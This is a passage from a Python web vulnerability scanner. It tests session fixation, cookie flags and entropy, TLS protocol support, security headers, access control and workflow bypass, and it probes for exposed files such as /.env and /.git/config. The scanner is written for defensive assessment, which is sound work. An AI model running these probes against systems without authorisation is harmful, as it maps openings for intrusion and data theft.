                        input_type = inp.get('type', '').lower()
                        input_name = inp.get('name', '').lower()
                        
                        if input_type == 'password':
                            password_field = inp.get('name', '')
                        elif input_type == 'text' and any(term in input_name for term in ['user', 'login', 'email', 'name']):
                            username_field = inp.get('name', '')
                    
                    if username_field and password_field:
                        login_form = {
                            'url': form_url,
                            'method': form_method,
                            'username_field': username_field,
                            'password_field': password_field
                        }
                        break
        
        except Exception as e:
            logger.error(f"Error finding login form: {str(e)}")
        
        if not login_form:
            logger.warning("No login form found for session fixation testing")
            result = {
                "target_url": target_url,
                "cookie_name": cookie_name,
                "vulnerable": False,
                "message": "No login form found for testing"
            }
            self.results["session_testing"]["fixation"] = result
            return result
        
        # Test for session fixation
        fixation_test_result = {}
        
        try:
            # Attempt login with existing session cookie
            cookies = {cookie_name: session_cookie}
            
            # Prepare login data with test credentials
            # In a real test, you'd use valid credentials
            form_data = {
                login_form['username_field']: 'test_user',
                login_form['password_field']: 'test_password'
            }
            
            # Send login request with existing session
            if login_form['method'] == 'post':
                response = requests.post(
                    login_form['url'],
                    data=form_data,
                    headers=self.headers,
                    cookies=cookies,
                    timeout=10,
                    allow_redirects=True
                )
            else:
                response = requests.get(
                    login_form['url'],
                    params=form_data,
                    headers=self.headers,
                    cookies=cookies,
                    timeout=10,
                    allow_redirects=True
                )
            
            # Check if session cookie changed after login
            new_session_cookie = None
            if cookie_name in response.cookies:
                new_session_cookie = response.cookies[cookie_name]
            
            # Determine if vulnerable to fixation
            vulnerable = False
            if new_session_cookie and new_session_cookie == session_cookie:
                vulnerable = True
                evidence = f"Session cookie '{cookie_name}' was not changed after login"
            elif not new_session_cookie:
                evidence = f"No new session cookie set, original session may remain valid"
                vulnerable = True
            else:
                evidence = f"Session cookie changed from {session_cookie} to {new_session_cookie}"
                vulnerable = False
            
            fixation_test_result = {
                'original_cookie': session_cookie,
                'new_cookie': new_session_cookie,
                'vulnerable': vulnerable,
                'evidence': evidence
            }
            
        except Exception as e:
            logger.error(f"Error testing session fixation: {str(e)}")
            fixation_test_result = {
                'error': str(e),
                'vulnerable': False
            }
        
        # Store results
        result = {
            "target_url": target_url,
            "cookie_name": cookie_name,
            "login_form": login_form,
            "test_result": fixation_test_result,
            "vulnerable": fixation_test_result.get('vulnerable', False)
        }
        
        self.results["session_testing"]["fixation"] = result
        return result
    
    def test_session_handling(self, target_url=None):
        """Test for session handling vulnerabilities"""
        target_url = target_url or self.target
        
        logger.info(f"Testing session handling on {target_url}")
        
        # Get session cookie
        session_cookie = None
        cookie_name = None
        cookie_properties = {}
        
        try:
            response = requests.get(target_url, headers=self.headers, timeout=10)
            
            # Look for session cookies
            for cookie in response.cookies:
                if any(term in cookie.name.lower() for term in ['sess', 'sid', 'auth', 'token']):
                    cookie_name = cookie.name
                    session_cookie = cookie.value
                    
                    # Capture cookie properties
                    cookie_properties = {
                        'domain': cookie.domain,
                        'path': cookie.path,
                        'secure': cookie.secure,
                        'httponly': cookie.has_nonstandard_attr('httponly'),
                        'samesite': None,
                        'expires': cookie.expires
                    }
                    
                    # Try to extract SameSite attribute
                    if 'Set-Cookie' in response.headers:
                        cookie_headers = response.headers.get_all('Set-Cookie') if hasattr(response.headers, 'get_all') else [response.headers.get('Set-Cookie')]
                        for header in cookie_headers:
                            if cookie_name in header:
                                if 'SameSite=Strict' in header:
                                    cookie_properties['samesite'] = 'Strict'
                                elif 'SameSite=Lax' in header:
                                    cookie_properties['samesite'] = 'Lax'
                                elif 'SameSite=None' in header:
                                    cookie_properties['samesite'] = 'None'
                    
                    break
            
            # If no obvious session cookie found, use the first cookie
            if not session_cookie and response.cookies:
                cookie_name = next(iter(response.cookies.keys()))
                session_cookie = response.cookies[cookie_name]
                
                # Capture cookie properties
                cookie = response.cookies[cookie_name]
                cookie_properties = {
                    'domain': cookie.domain,
                    'path': cookie.path,
                    'secure': cookie.secure,
                    'httponly': cookie.has_nonstandard_attr('httponly'),
                    'samesite': None,
                    'expires': cookie.expires
                }
        
        except Exception as e:
            logger.error(f"Error getting session cookie: {str(e)}")
        
        if not session_cookie:
            logger.warning("No session cookie found for handling testing")
            result = {
                "target_url": target_url,
                "vulnerable": False,
                "message": "No session cookie found"
            }
            self.results["session_testing"]["handling"] = result
            return result
        
        # Analyze session cookie security
        vulnerabilities = []
        
        # Check Secure flag
        if not cookie_properties.get('secure'):
            vulnerabilities.append({
                'type': 'Missing Secure Flag',
                'description': 'The session cookie can be transmitted over unencrypted HTTP',
                'severity': 'High',
                'recommendation': 'Set the Secure flag on all session cookies'
            })
        
        # Check HttpOnly flag
        if not cookie_properties.get('httponly'):
            vulnerabilities.append({
                'type': 'Missing HttpOnly Flag',
                'description': 'The session cookie can be accessed by JavaScript, making it vulnerable to XSS attacks',
                'severity': 'Medium',
                'recommendation': 'Set the HttpOnly flag on all session cookies'
            })
        
        # Check SameSite attribute
        if not cookie_properties.get('samesite'):
            vulnerabilities.append({
                'type': 'Missing SameSite Attribute',
                'description': 'The session cookie does not have SameSite protection',
                'severity': 'Medium',
                'recommendation': 'Set SameSite=Lax or SameSite=Strict for session cookies'
            })
        elif cookie_properties.get('samesite') == 'None':
            # SameSite=None is only acceptable with the Secure flag
            if not cookie_properties.get('secure'):
                vulnerabilities.append({
                    'type': 'Insecure SameSite Configuration',
                    'description': 'SameSite=None without Secure flag is insecure',
                    'severity': 'High',
                    'recommendation': 'Use SameSite=None only with the Secure flag'
                })
        
        # Check session cookie value properties
        if session_cookie:
            # Check cookie entropy
            try:
                entropy = self._calculate_entropy(session_cookie)
                if entropy < 3.0:  # Low entropy threshold
                    vulnerabilities.append({
                        'type': 'Low Entropy Session ID',
                        'description': 'Session cookie appears to have low entropy (predictable)',
                        'severity': 'High',
                        'entropy': entropy,
                        'recommendation': 'Use cryptographically secure session ID generation'
                    })
            except:
                pass
            
            # Check if session cookie is sequential
            if session_cookie.isdigit():
                vulnerabilities.append({
                    'type': 'Sequential Session ID',
                    'description': 'Session ID appears to be numeric, potentially sequential',
                    'severity': 'High',
                    'recommendation': 'Use cryptographically secure random session IDs'
                })
        
        # Store results
        result = {
            "target_url": target_url,
            "cookie_name": cookie_name,
            "cookie_properties": cookie_properties,
            "vulnerabilities_found": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
            "vulnerable": len(vulnerabilities) > 0
        }
        
        self.results["session_testing"]["handling"] = result
        return result
    
    def _calculate_entropy(self, value):
        """Calculate Shannon entropy of a string"""
        if not value:
            return 0
            
        # Count character frequencies
        char_count = {}
        for char in value:
            char_count[char] = char_count.get(char, 0) + 1
        
        # Calculate entropy
        length = len(value)
        entropy = 0.0
        for count in char_count.values():
            probability = count / length
            entropy -= probability * (math.log(probability) / math.log(2))
        
        return entropy
    
    #==========================================
    # 6. Cryptographic Testing Methods
    #==========================================
    
    def test_ssl_tls_configuration(self, target=None, port=443):
        """Test for SSL/TLS configuration issues"""
        target = target or self.target
        
        logger.info(f"Testing SSL/TLS configuration on {target}:{port}")
        
        # Ensure we have a hostname
        if target.startswith(('http://', 'https://')):
            parsed = urlparse(target)
            hostname = parsed.netloc
            if ':' in hostname:
                hostname = hostname.split(':')[0]
        else:
            hostname = target
        
        # Get IP if hostname
        try:
            if not all(c.isdigit() or c == '.' for c in hostname):
                ip = socket.gethostbyname(hostname)
            else:
                ip = hostname
        except socket.gaierror:
            logger.error(f"Could not resolve hostname {hostname}")
            result = {
                "target": hostname,
                "error": f"Could not resolve hostname {hostname}"
            }
            self.results["crypto_testing"]["ssl_tls"] = result
            return result
        
        # Test supported protocols
        protocols = {
            'SSLv2': False,
            'SSLv3': False,
            'TLSv1.0': False,
            'TLSv1.1': False,
            'TLSv1.2': False,
            'TLSv1.3': False
        }
        
        # Test SSL/TLS protocols
        try:
            # Try connect with different protocols
            # SSLv2 (obsolete and insecure)
            try:
                context = ssl.SSLContext(ssl.PROTOCOL_SSLv2)
                with socket.create_connection((hostname, port), timeout=5) as sock:
                    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                        protocols['SSLv2'] = True
            except:
                pass
            
            # SSLv3 (obsolete and insecure)
            try:
                context = ssl.SSLContext(ssl.PROTOCOL_SSLv3)
                with socket.create_connection((hostname, port), timeout=5) as sock:
                    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                        protocols['SSLv3'] = True
            except:
                pass
            
            # TLSv1.0 (outdated)
            try:
                context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
                with socket.create_connection((hostname, port), timeout=5) as sock:
                    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                        protocols['TLSv1.0'] = True
            except:
                pass
            
            # TLSv1.1 (outdated)
            try:
                context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_1)
                with socket.create_connection((hostname, port), timeout=5) as sock:
                    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                        protocols['TLSv1.1'] = True
            except:
                pass
            
            # TLSv1.2 (current standard)
            try:
                context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
                with socket.create_connection((hostname, port), timeout=5) as sock:
                    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                        protocols['TLSv1.2'] = True
            except:
                pass
            
            # TLSv1.3 (newest standard)
            try:
                context = ssl.SSLContext(ssl.PROTOCOL_TLS)
                context.minimum_version = ssl.TLSVersion.TLSv1_3
                with socket.create_connection((hostname, port), timeout=5) as sock:
                    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                        protocols['TLSv1.3'] = True
            except:
                pass
        
        except Exception as e:
            logger.error(f"Error testing SSL/TLS protocols: {str(e)}")
        
        # Get certificate info
        cert_info = {}
        try:
            context = ssl.create_default_context()
            with socket.create_connection((hostname, port), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    cert_info = {
                        'subject': dict(x[0] for x in cert['subject']),
                        'issuer': dict(x[0] for x in cert['issuer']),
                        'version': cert['version'],
                        'notBefore': cert['notBefore'],
                        'notAfter': cert['notAfter']
                    }
        except Exception as e:
            logger.error(f"Error getting certificate info: {str(e)}")
        
        # Analyze results for vulnerabilities
        vulnerabilities = []
        
        # Check for outdated protocols
        if protocols.get('SSLv2'):
            vulnerabilities.append({
                'type': 'Insecure Protocol',
                'description': 'SSLv2 is enabled, which is critically insecure',
                'severity': 'Critical',
                'recommendation': 'Disable SSLv2 support on the server'
            })
        
        if protocols.get('SSLv3'):
            vulnerabilities.append({
                'type': 'Insecure Protocol',
                'description': 'SSLv3 is enabled, which is critically insecure (POODLE vulnerability)',
                'severity': 'Critical',
                'recommendation': 'Disable SSLv3 support on the server'
            })
        
        if protocols.get('TLSv1.0'):
            vulnerabilities.append({
                'type': 'Outdated Protocol',
                'description': 'TLSv1.0 is enabled, which is outdated and has known weaknesses',
                'severity': 'High',
                'recommendation': 'Disable TLSv1.0 support on the server'
            })
        
        if protocols.get('TLSv1.1'):
            vulnerabilities.append({
                'type': 'Outdated Protocol',
                'description': 'TLSv1.1 is enabled, which is outdated',
                'severity': 'Medium',
                'recommendation': 'Disable TLSv1.1 support on the server'
            })
        
        if not protocols.get('TLSv1.2') and not protocols.get('TLSv1.3'):
            vulnerabilities.append({
                'type': 'Missing Modern Protocols',
                'description': 'Neither TLSv1.2 nor TLSv1.3 is supported',
                'severity': 'Critical',
                'recommendation': 'Enable TLSv1.2 and TLSv1.3 on the server'
            })
        
        # Check certificate expiration
        if cert_info and 'notAfter' in cert_info:
            try:
                expires = ssl.cert_time_to_seconds(cert_info['notAfter'])
                current = time.time()
                days_left = (expires - current) / (24 * 60 * 60)
                
                if days_left < 0:
                    vulnerabilities.append({
                        'type': 'Expired Certificate',
                        'description': f'SSL certificate has expired',
                        'severity': 'Critical',
                        'recommendation': 'Renew the SSL certificate immediately'
                    })
                elif days_left < 30:
                    vulnerabilities.append({
                        'type': 'Certificate Expiring Soon',
                        'description': f'SSL certificate expires in {int(days_left)} days',
                        'severity': 'High',
                        'recommendation': 'Renew the SSL certificate soon'
                    })
            except:
                pass
        
        # Store results
        result = {
            "target": hostname,
            "port": port,
            "protocols": protocols,
            "certificate": cert_info,
            "vulnerabilities_found": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
            "vulnerable": len(vulnerabilities) > 0
        }
        
        self.results["crypto_testing"]["ssl_tls"] = result
        return result
    
    def test_crypto_implementations(self, target_url=None):
        """Test for cryptographic implementation issues"""
        target_url = target_url or self.target
        
        logger.info(f"Testing cryptographic implementations on {target_url}")
        
        # Test cases for crypto implementation issues
        vulnerabilities = []
        
        # Test 1: Check for HTTPS usage
        if not target_url.startswith('https://'):
            vulnerabilities.append({
                'type': 'Missing HTTPS',
                'description': 'The site is not using HTTPS, which exposes all traffic to eavesdropping',
                'severity': 'Critical',
                'recommendation': 'Implement HTTPS throughout the site'
            })
        else:
            # Site uses HTTPS, check for HTTP to HTTPS redirection
            try:
                http_url = re.sub(r'^https://', 'http://', target_url)
                response = requests.get(http_url, headers=self.headers, timeout=10, allow_redirects=False)
                
                if response.status_code not in [301, 302, 307, 308]:
                    vulnerabilities.append({
                        'type': 'Missing HTTP to HTTPS Redirect',
                        'description': 'The site does not redirect HTTP traffic to HTTPS',
                        'severity': 'Medium',
                        'recommendation': 'Implement a permanent redirect from HTTP to HTTPS'
                    })
            except Exception as e:
                logger.error(f"Error testing HTTP to HTTPS redirect: {str(e)}")
        
        # Test 2: Check for HSTS header
        try:
            response = requests.get(target_url, headers=self.headers, timeout=10)
            
            if 'Strict-Transport-Security' not in response.headers:
                vulnerabilities.append({
                    'type': 'Missing HSTS Header',
                    'description': 'The site is not using HTTP Strict Transport Security',
                    'severity': 'Medium',
                    'recommendation': 'Implement HSTS with a max-age of at least 6 months'
                })
            else:
                hsts_header = response.headers['Strict-Transport-Security']
                max_age_match = re.search(r'max-age=(\d+)', hsts_header)
                
                if max_age_match:
                    max_age = int(max_age_match.group(1))
                    if max_age < 15768000:  # 6 months in seconds
                        vulnerabilities.append({
                            'type': 'Insufficient HSTS Max-Age',
                            'description': f'HSTS max-age ({max_age} seconds) is less than 6 months',
                            'severity': 'Low',
                            'recommendation': 'Increase HSTS max-age to at least 6 months (15768000 seconds)'
                        })
                
                if 'includeSubDomains' not in hsts_header:
                    vulnerabilities.append({
                        'type': 'HSTS Missing includeSubDomains',
                        'description': 'HSTS header does not include subdomains',
                        'severity': 'Low',
                        'recommendation': 'Add includeSubDomains directive to HSTS header'
                    })
                    
                if 'preload' not in hsts_header:
                    vulnerabilities.append({
                        'type': 'HSTS Missing Preload',
                        'description': 'HSTS header does not include preload directive',
                        'severity': 'Info',
                        'recommendation': 'Consider adding preload directive to HSTS header'
                    })
        
        except Exception as e:
            logger.error(f"Error testing HSTS: {str(e)}")
        
        # Store results
        result = {
            "target_url": target_url,
            "vulnerabilities_found": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
            "vulnerable": len(vulnerabilities) > 0
        }
        
        self.results["crypto_testing"]["implementations"] = result
        return result
    
    #==========================================
    # 7. Business Logic Testing Methods
    #==========================================
    
    def test_access_controls(self, target_url=None):
        """Test for access control vulnerabilities"""
        target_url = target_url or self.target
        
        logger.info(f"Testing access controls on {target_url}")
        
        # Find URLs to test
        urls_to_test = []
        try:
            response = requests.get(target_url, headers=self.headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find links
            for a in soup.find_all('a', href=True):
                href = a['href']
                if href.startswith('#') or href.startswith('javascript:'):
                    continue
                    
                full_url = urljoin(target_url, href)
                parsed_url = urlparse(full_url)
                
                # Only include URLs from the same domain
                if parsed_url.netloc == urlparse(target_url).netloc:
                    urls_to_test.append(full_url)
            
            # Find forms
            for form in soup.find_all('form'):
                action = form.get('action', '')
                form_url = urljoin(target_url, action) if action else target_url
                parsed_url = urlparse(form_url)
                
                # Only include URLs from the same domain
                if parsed_url.netloc == urlparse(target_url).netloc:
                    urls_to_test.append(form_url)
        
        except Exception as e:
            logger.error(f"Error finding URLs to test: {str(e)}")
        
        # Deduplicate URLs
        urls_to_test = list(set(urls_to_test))
        
        # Test access to each URL without authentication
        results = []
        for url in urls_to_test[:10]:  # Limit to first 10 for brevity
            try:
                response = requests.get(url, headers=self.headers, timeout=10)
                
                # Check if access was granted
                if response.status_code == 200:
                    # Look for indicators of restricted content
                    restricted_indicators = [
                        'admin', 'dashboard', 'account', 'profile', 'settings',
                        'private', 'billing', 'payment', 'invoice',
                        'users', 'members', 'customers'
                    ]
                    
                    is_restricted = False
                    for indicator in restricted_indicators:
                        if indicator in url.lower() or indicator in response.text.lower():
                            is_restricted = True
                            break
                    
                    if is_restricted:
                        results.append({
                            'url': url,
                            'status_code': response.status_code,
                            'issue': 'Potential unauthorized access to restricted area',
                            'evidence': f"URL contains restricted indicator: {[ind for ind in restricted_indicators if ind in url.lower() or ind in response.text.lower()]}"
                        })
            
            except Exception as e:
                logger.error(f"Error testing access to {url}: {str(e)}")
        
        # Store results
        result = {
            "target_url": target_url,
            "urls_tested": len(urls_to_test[:10]),
            "total_urls_found": len(urls_to_test),
            "issues_found": len(results),
            "issues": results,
            "vulnerable": len(results) > 0
        }
        
        self.results["business_logic"]["access_controls"] = result
        return result
    
    def test_data_integrity(self, target_url=None):
        """Test for data integrity vulnerabilities"""
        target_url = target_url or self.target
        
        logger.info(f"Testing data integrity on {target_url}")
        
        # Find forms to test
        forms_to_test = []
        try:
            response = requests.get(target_url, headers=self.headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all forms
            for form in soup.find_all('form'):
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                form_url = urljoin(target_url, action) if action else target_url
                
                # Get all input fields
                inputs = []
                for inp in form.find_all(['input', 'select', 'textarea']):
                    input_name = inp.get('name', '')
                    input_type = inp.get('type', '').lower() if inp.name == 'input' else inp.name
                    
                    if input_name and input_type not in ['submit', 'button', 'reset', 'image']:
                        inputs.append({
                            'name': input_name,
                            'type': input_type
                        })
                
                if inputs:
                    forms_to_test.append({
                        'url': form_url,
                        'method': method,
                        'inputs': inputs
                    })
        
        except Exception as e:
            logger.error(f"Error finding forms to test: {str(e)}")
        
        # Test for hidden field manipulation
        results = []
        for form in forms_to_test:
            hidden_fields = [inp for inp in form['inputs'] if inp['type'] == 'hidden']
            
            if hidden_fields:
                # Found hidden fields to test
                for field in hidden_fields:
                    # Check if hidden field name suggests it's a critical value
                    critical_indicators = [
                        'price', 'cost', 'amount', 'total', 'discount', 'id',
                        'role', 'admin', 'permission', 'access', 'level',
                        'quantity', 'tax', 'shipping'
                    ]
                    
                    if any(indicator in field['name'].lower() for indicator in critical_indicators):
                        results.append({
                            'url': form['url'],
                            'method': form['method'],
                            'field': field['name'],
                            'issue': 'Critical hidden field could be manipulated',
                            'evidence': f"Hidden field name suggests it may control {[ind for ind in critical_indicators if ind in field['name'].lower()]}"
                        })
        
        # Store results
        result = {
            "target_url": target_url,
            "forms_tested": len(forms_to_test),
            "issues_found": len(results),
            "issues": results,
            "vulnerable": len(results) > 0
        }
        
        self.results["business_logic"]["data_integrity"] = result
        return result
    
    def test_workflow_bypass(self, target_url=None):
        """Test for workflow bypass vulnerabilities"""
        target_url = target_url or self.target
        
        logger.info(f"Testing workflow bypass on {target_url}")
        
        # Crawl the site to find potential workflow steps
        workflow_urls = []
        try:
            response = requests.get(target_url, headers=self.headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Look for URLs that might be part of a workflow
            for a in soup.find_all('a', href=True):
                href = a['href']
                if href.startswith('#') or href.startswith('javascript:'):
                    continue
                    
                full_url = urljoin(target_url, href)
                parsed_url = urlparse(full_url)
                
                # Only include URLs from the same domain
                if parsed_url.netloc == urlparse(target_url).netloc:
                    # Look for workflow indicators
                    workflow_indicators = [
                        'step', 'page', 'checkout', 'process', 'wizard',
                        'continue', 'next', 'confirm', 'review', 'complete'
                    ]
                    
                    if any(indicator in href.lower() for indicator in workflow_indicators):
                        workflow_urls.append({
                            'url': full_url,
                            'text': a.text.strip(),
                            'evidence': f"URL contains workflow indicator: {[ind for ind in workflow_indicators if ind in href.lower()]}"
                        })
        
        except Exception as e:
            logger.error(f"Error crawling for workflow steps: {str(e)}")
        
        # Test for direct access to workflow steps (skipping previous steps)
        results = []
        for workflow in workflow_urls:
            try:
                # Attempt to access workflow step directly
                response = requests.get(workflow['url'], headers=self.headers, timeout=10)
                
                # Check if access was granted
                if response.status_code == 200:
                    # Look for success indicators in response
                    success_indicators = [
                        'success', 'complete', 'thank you', 'confirmed',
                        'processed', 'approved', 'finished'
                    ]
                    
                    access_granted = False
                    for indicator in success_indicators:
                        if indicator in response.text.lower():
                            access_granted = True
                            break
                    
                    if access_granted:
                        results.append({
                            'url': workflow['url'],
                            'text': workflow.get('text', ''),
                            'status_code': response.status_code,
                            'issue': 'Potential workflow bypass - direct step access',
                            'evidence': workflow.get('evidence', '') + f" | Success indicator found: {[ind for ind in success_indicators if ind in response.text.lower()]}"
                        })
            
            except Exception as e:
                logger.error(f"Error testing workflow bypass on {workflow['url']}: {str(e)}")
        
        # Store results
        result = {
            "target_url": target_url,
            "workflow_steps_found": len(workflow_urls),
            "issues_found": len(results),
            "issues": results,
            "workflow_urls": workflow_urls,
            "vulnerable": len(results) > 0
        }
        
        self.results["business_logic"]["workflow_bypass"] = result
        return result
    
    #==========================================
    # 8. Configuration Testing Methods
    #==========================================
    
    def test_http_headers(self, target_url=None):
        """Test for HTTP header security issues"""
        target_url = target_url or self.target
        
        logger.info(f"Testing HTTP headers on {target_url}")
        
        # Get HTTP headers
        try:
            response = requests.get(target_url, headers=self.headers, timeout=10)
            response_headers = response.headers
        except Exception as e:
            logger.error(f"Error getting HTTP headers: {str(e)}")
            result = {
                "target_url": target_url,
                "error": str(e)
            }
            self.results["config_testing"]["http_headers"] = result
            return result
        
        # Security headers to check
        security_headers = {
            'Strict-Transport-Security': {
                'description': 'HTTP Strict Transport Security',
                'recommendation': 'Add "Strict-Transport-Security: max-age=31536000; includeSubDomains"'
            },
            'Content-Security-Policy': {
                'description': 'Content Security Policy',
                'recommendation': 'Implement a Content Security Policy to prevent XSS attacks'
            },
            'X-Content-Type-Options': {
                'description': 'X-Content-Type-Options',
                'recommendation': 'Add "X-Content-Type-Options: nosniff"'
            },
            'X-Frame-Options': {
                'description': 'X-Frame-Options',
                'recommendation': 'Add "X-Frame-Options: DENY" or "X-Frame-Options: SAMEORIGIN"'
            },
            'X-XSS-Protection': {
                'description': 'X-XSS-Protection',
                'recommendation': 'Add "X-XSS-Protection: 1; mode=block"'
            },
            'Referrer-Policy': {
                'description': 'Referrer Policy',
                'recommendation': 'Add "Referrer-Policy: strict-origin-when-cross-origin"'
            },
            'Permissions-Policy': {
                'description': 'Permissions Policy',
                'recommendation': 'Implement a Permissions Policy to restrict browser features'
            }
        }
        
        # Check for missing security headers
        missing_headers = []
        for header, info in security_headers.items():
            if header not in response_headers:
                missing_headers.append({
                    'header': header,
                    'description': info['description'],
                    'recommendation': info['recommendation']
                })
        
        # Check Content-Security-Policy if present
        csp_issues = []
        if 'Content-Security-Policy' in response_headers:
            csp = response_headers['Content-Security-Policy']
            
            # Check for unsafe directives
            if "unsafe-inline" in csp:
                csp_issues.append({
                    'issue': 'unsafe-inline in CSP',
                    'description': 'Allows inline scripts/styles, potentially enabling XSS attacks',
                    'recommendation': 'Remove unsafe-inline and use nonces or hashes instead'
                })
            
            if "unsafe-eval" in csp:
                csp_issues.append({
                    'issue': 'unsafe-eval in CSP',
                    'description': 'Allows eval() and similar functions, potentially enabling XSS attacks',
                    'recommendation': 'Remove unsafe-eval and refactor code to avoid eval()'
                })
            
            # Check for missing default-src or wildcard
            if "default-src" not in csp or "*" in csp.replace('data:*', ''):
                csp_issues.append({
                    'issue': 'Missing or overly permissive default-src',
                    'description': 'A missing or wildcard default-src reduces CSP effectiveness',
                    'recommendation': 'Add specific default-src directive and avoid wildcards'
                })
        
        # Check Strict-Transport-Security if present
        hsts_issues = []
        if 'Strict-Transport-Security' in response_headers:
            hsts = response_headers['Strict-Transport-Security']
            
            # Check max-age
            max_age_match = re.search(r'max-age=(\d+)', hsts)
            if max_age_match:
                max_age = int(max_age_match.group(1))
                if max_age < 15768000:  # Less than 6 months
                    hsts_issues.append({
                        'issue': 'Short max-age',
                        'description': f'HSTS max-age is {max_age} seconds, less than recommended 6 months',
                        'recommendation': 'Increase max-age to at least 15768000 (6 months)'
                    })
            
            # Check includeSubDomains
            if 'includeSubDomains' not in hsts:
                hsts_issues.append({
                    'issue': 'Missing includeSubDomains',
                    'description': 'HSTS does not include subdomains',
                    'recommendation': 'Add includeSubDomains directive to protect all subdomains'
                })
        
        # Store results
        result = {
            "target_url": target_url,
            "response_headers": dict(response_headers),
            "missing_security_headers": missing_headers,
            "csp_issues": csp_issues,
            "hsts_issues": hsts_issues,
            "total_issues": len(missing_headers) + len(csp_issues) + len(hsts_issues),
            "vulnerable": len(missing_headers) + len(csp_issues) + len(hsts_issues) > 0
        }
        
        self.results["config_testing"]["http_headers"] = result
        return result
    
    def test_server_configuration(self, target_url=None):
        """Test for server configuration issues"""
        target_url = target_url or self.target
        
        logger.info(f"Testing server configuration on {target_url}")
        
        # Get server information
        try:
            response = requests.get(target_url, headers=self.headers, timeout=10)
            server_header = response.headers.get('Server', '')
            x_powered_by = response.headers.get('X-Powered-By', '')
        except Exception as e:
            logger.error(f"Error getting server information: {str(e)}")
            result = {
                "target_url": target_url,
                "error": str(e)
            }
            self.results["config_testing"]["server_config"] = result
            return result
        
        # Check for server information disclosure
        issues = []
        
        if server_header:
            issues.append({
                'header': 'Server',
                'value': server_header,
                'issue': 'Server header reveals server software/version',
                'recommendation': 'Configure the server to remove or obscure the Server header'
            })
        
        if x_powered_by:
            issues.append({
                'header': 'X-Powered-By',
                'value': x_powered_by,
                'issue': 'X-Powered-By header reveals technology stack',
                'recommendation': 'Configure the server to remove the X-Powered-By header'
            })
        
        # Test for common configuration files
        config_files = [
            '/.env',
            '/config.php',
            '/wp-config.php',
            '/config.xml',
            '/config.json',
            '/config.yaml',
            '/config.ini',
            '/config/',
            '/.git/config',
            '/.svn/entries',
            '/app.config',
            '/web.config',
            '/settings.py',
            '/configuration.php',
            '/phpinfo.php',
            '/info.php'
        ]
        
        exposed_configs = []
        for config_file in config_files:
            try:
                config_url = urljoin(target_url, config_file)
                response = requests.get(config_url, headers=self.headers, timeout=5)
                
                # Check for successful response (not 404)
                if response.status_code not in [404, 403, 401]:
                    # Check if it's not a redirect to a login page
                    redirect_to_login = False
                    if response.history:
                        final_url = response.url.lower()
                        if any(term in final_url for term in ['login', 'signin', 'auth']):
                            redirect_to_login = True
                    
                    if not redirect_to_login:
                        exposed_configs.append({
                            'url': config_url,
                            'status_code': response.status_code,
                            'content_length': len(response.content),
                            'content_type': response.headers.get('Content-Type', '')
                        })
            
            except Exception as e:
                logger.error(f"Error checking config file {config_file}: {str(e)}")
        
        if exposed_configs:
            issues.append({
                'issue': 'Exposed configuration files',
                'files': exposed_configs,
                'recommendation': 'Restrict access to configuration files or move them outside web root'
            })
        
        # Test for directory listing
        try:
            common_dirs = ['/images', '/css', '/js', '/uploads', '/includes', '/inc', '/scripts']
            
            for directory in common_dirs:
                dir_url = urljoin(target_url, directory)
                response = requests.get(dir_url, headers=self.headers, timeout=5)
                
                # Check for directory listing
                if response.status_code == 200:
                    # Look for directory listing indicators
                    if 'Index of' in response.text and '<table' in response.text:
                        issues.append({
                            'issue': 'Directory listing enabled',
                            'url': dir_url,
                            'recommendation': 'Disable directory listing in server configuration'
                        })
                        break
        
        except Exception as e:
            logger.error(f"Error checking directory listing: {str(e)}")
        
        # Store results
        result = {
            "target_url": target_url,
            "server_header": server_header,
            "x_powered_by": x_powered_by,
            "exposed_configs": exposed_configs,
            "issues": issues,
            "issues_count": len(issues),
            "vulnerable": len(issues) > 0
        }
        
        self.results["config_testing"]["server_config"] = result
        return result
    
    #==========================================
    # 9. Denial of Service Testing Methods
    #==========================================
    
    def test_dos_resistance(self, target_url=None, light_test=True):
        """Test for denial of service vulnerabilities (light testing only)"""
        target_url = target_url or self.target
        
        logger.info(f"Testing DoS resistance on {target_url} (light tests only)")
        
        # IMPORTANT: This method only does light testing and analysis
        # Full DoS testing requires explicit permission and should be done carefully
        # These are passive or minimal-impact tests
        
        issues = []
        
        # Test 1: Check for rate limiting on API endpoints
        api_endpoints = []
        try:
            # Look for potential API endpoints
            parsed_url = urlparse(target_url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            common_api_paths = [
                '/api', '/api/v1', '/api/v2', '/api/v3',
                '/rest', '/rest/v1', '/graphql', '/service',
                '/api/users', '/api/products', '/api/data'
            ]
            
            for path in common_api_paths:
                api_url = urljoin(base_url, path)
                try:
                    response = requests.get(api_url, headers=self.headers, timeout=5)
                    
                    # If we get a non-404 response, it might be an API endpoint
                    if response.status_code != 404:
                        content_type = response.headers.get('Content-Type', '')
                        
                        # API responses often return JSON or XML
                        if 'json' in content_type or 'xml' in content_type:
                            api_endpoints.append({
                                'url': api_url,
                                'status_code': response.status_code,
                                'content_type': content_type
                            })
                
                except Exception as e:
                    logger.error(f"Error checking API endpoint {path}: {str(e)}")
            
            # Test rate limiting on discovered endpoints
            for api in api_endpoints:
                # Make a few quick requests to check for rate limiting
                has_rate_limiting = False
                
                for _ in range(5):  # Make 5 requests in quick succession
                    try:
                        response = requests.get(api['url'], headers=self.headers, timeout=5)
                        
                        # Check for rate limiting headers or response
                        rate_limit_headers = [
                            'X-RateLimit-Limit', 'X-RateLimit-Remaining', 'X-RateLimit-Reset',
                            'Retry-After', 'X-Rate-Limit', 'RateLimit-Limit'
                        ]
                        
                        for header in rate_limit_headers:
                            if header in response.headers:
